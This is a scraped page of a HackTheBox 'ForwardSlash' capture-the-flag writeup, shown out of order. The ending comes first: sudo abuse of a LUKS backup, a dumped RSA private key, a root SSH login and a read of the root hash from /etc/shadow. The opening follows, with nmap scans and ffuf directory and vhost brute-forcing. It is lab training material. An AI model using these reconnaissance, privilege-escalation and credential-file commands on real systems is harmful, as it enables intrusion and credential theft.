NOPASSWD: /sbin/cryptsetup luksOpen * (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/ (root) NOPASSWD: /bin/umount ./mnt/ First we open the LUKS container and create a mount point.\n1 2 3 4 5 6 pain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup Enter passphrase for /var/backups/recovery/encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf pain@forwardslash:~/encryptorinator$ mkdir -p /tmp/cyfun2/mnt pain@forwardslash:~/encryptorinator$ cd /tmp/cyfun2 Then we can mount the openned container:\n1 pain@forwardslash:/tmp/cyfun2$ sudo /bin/mount /dev/mapper/backup ./mnt/ The mounted device contains only one file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 pain@forwardslash:/tmp/cyfun2$ cat mnt/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9 MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO 3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn 5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8 6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi /vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA 1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o -----END RSA PRIVATE KEY----- This must be the root SSH key.\n1 2 $ chmod 600 id_rsa_root $ ssh root@forwardslash.htb -i id_rsa_root Let’s grab the loot!\n1 2 3 4 5 root@forwardslash:~# cat root.txt 12c0583823e80694824b9dd3e6c2ae93 root@forwardslash:~# cat /etc/shadow | grep root root:$6$daB3I84E$NnzV4cHTAgWsPGWoBKLO2W6NotitrAk6udeTh0cxvXWHIkDXZQtss13QP2gTgFOMdIYdQ8CtvSxzznHI.nVmW.:18326:0:99999:7::: : [ffuf]:https://github.com/ffuf/ffuf [xxeserv]:https://github.com/staaldraad/xxeserv [PEASS]:https://github.com/carlospolop/PEASS-ng\n","wordCount":"3780","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png","datePublished":"2020-07-05T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/forwardslash/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">ForwardSlash</h1><div class=post-description>ForwardSlash HackTheBox writeup</div><div class=post-meta><span title='2020-07-05 00:00:00 +0000 UTC'>July 5, 2020</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;3780 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/hard/ class=post-tag title=hard>hard</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png alt="ForwardSlash HackTheBox Machine"><p>ForwardSlash - Hard Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation-file-disclosure--directory-traversal>HTTP exploitation: file disclosure & directory traversal</a></li><li><a href=#http-exploitation-ssrf>HTTP exploitation: SSRF</a></li><li><a href=#http-exploitation-xxe>HTTP exploitation: XXE</a></li><li><a href=#network-exploitation-credential-stuffing>Network exploitation: credential stuffing</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation--from-chiv-to-pain>Privilege Escalation : from chiv to pain</a></li><li><a href=#decrypting-the-ciphertext>Decrypting the ciphertext</a></li><li><a href=#privilege-escalation--from-pain-to-root>Privilege Escalation : from pain to root</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> ForwardSlash</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/239>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 40</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><p><strong>TL;DR</strong>: There is a web application with a parameter vulnerable to file
disclosure, directory traversal and SSRF (not LFI/RFI). Then we can exploit
an OOB XXE over FTP to steal FTP credentials. Then with credential stuffing
we land on the box via SSH. On the system we exploit a SUID binary to read
a configuration file that leaks a database password. With credential stuffing
again we can elevate to a more powerful user via SSH. Then we have to break
a custom crypto algorithm to decrypt a ciphertext. The decrypted cyphertext
gives the password of a LUKS container. Then we can mount the container
with sudo permissions and get the root SSH private key.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap	ffuf curl burpsuite xxeserv peass haiti openssh
</span></span></code></pre></td></tr></table></div></div><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Let&rsquo;s start by scanning port and services with <a href=https://nmap.org/>nmap</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Fri Jun 12 13:17:07 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.183
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.183
</span></span><span class=line><span class=cl>Host is up (0.022s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
</span></span><span class=line><span class=cl>|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Did not follow redirect to http://forwardslash.htb
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Fri Jun 12 13:17:36 2020 -- 1 IP address (1 host up) scanned in 29.63 seconds
</span></span></code></pre></td></tr></table></div></div><p>If we try to reach http://10.10.10.183, we are redirected to <a href=http://forwardslash.htb>http://forwardslash.htb</a></p><p>So let&rsquo;s edit <code>/etc/hosts</code> to add this entry:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.10.183 forwardslash.htb
</span></span></code></pre></td></tr></table></div></div><h3 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h3><p>Let&rsquo;s see what we have at <a href=http://forwardslash.htb/>http://forwardslash.htb/</a></p><p>So the site was defaced. The defacer is talking about XML so there must be a XXE
and is also talking about <em>Automatic FTP Logins</em>.</p><h3 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h3><p>Let&rsquo;s find if there are files hidden somewhere with [ffuf][ffuf]:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>fc</span> <span class=mi>403</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>1.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1695</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>207</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>42</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>note</span><span class=o>.</span><span class=n>txt</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>216</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>39</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>5</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>76534</span><span class=o>/</span><span class=mi>76534</span><span class=p>]</span><span class=err>┬á</span><span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>1700</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>45</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>There is one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl http://forwardslash.htb/note.txt
</span></span><span class=line><span class=cl>Pain, we were hacked by some skids that call themselves the &#34;Backslash Gang&#34;... I know... That name...
</span></span><span class=line><span class=cl>Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-chiv
</span></span></code></pre></td></tr></table></div></div><p>So if there is a backup site it may be online too. Let&rsquo;s find it by bruteforcing virtual hosts with subdomains:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.183</span><span class=o>/</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>H</span> <span class=s1>&#39;Host: FUZZ.forwardslash.htb&#39;</span> <span class=o>-</span><span class=n>fs</span> <span class=mi>1695</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>1.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.183</span><span class=o>/</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Header</span>           <span class=p>:</span> <span class=n>Host</span><span class=p>:</span> <span class=n>FUZZ</span><span class=o>.</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>size</span><span class=p>:</span> <span class=mi>1695</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>backup</span>                  <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>1267</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>336</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>40</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>38267</span><span class=o>/</span><span class=mi>38267</span><span class=p>]</span><span class=err>┬á</span><span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>708</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s add <code>backup.forwardslash.htb</code> to <code>/etc/hosts</code> too.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.10.183 backup.forwardslash.htb
